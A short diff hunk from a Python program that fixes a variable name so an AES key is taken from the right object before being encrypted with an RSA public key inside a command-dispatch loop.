@@ -517,7 +517,7 @@ while True:
             elif int(float(command)) == 401875051:
                 cmd_AES = AES256()
 
-                ae_key16 = shutdown_AES.get_key()
+                ae_key16 = cmd_AES.get_key()
                 apubKey16 = RSA.import_key(known_hosts[0])
                 encryptor16 = PKCS1_OAEP.new(apubKey16)
                 e_key16 = encryptor16.encrypt(ae_key16)
